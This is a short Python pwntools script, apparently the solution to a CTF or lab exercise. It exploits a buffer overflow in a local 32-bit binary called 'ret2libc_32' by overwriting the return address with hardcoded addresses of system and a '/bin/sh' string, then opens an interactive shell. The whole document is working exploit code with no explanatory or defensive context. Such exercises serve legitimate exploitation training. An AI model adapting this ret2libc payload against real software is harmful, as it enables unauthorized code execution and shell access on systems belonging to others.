#!/usr/bin/python
from pwn import *

system_address = 0x0804ee20
bin_sh_address = 0x80bbb20

payload = 'A' * 76
payload += p32(system_address)
payload += p32(0xdeadbeef)
payload += p32(bin_sh_address)

p = process("./ret2libc_32")
p.sendline(payload)
p.interactive()
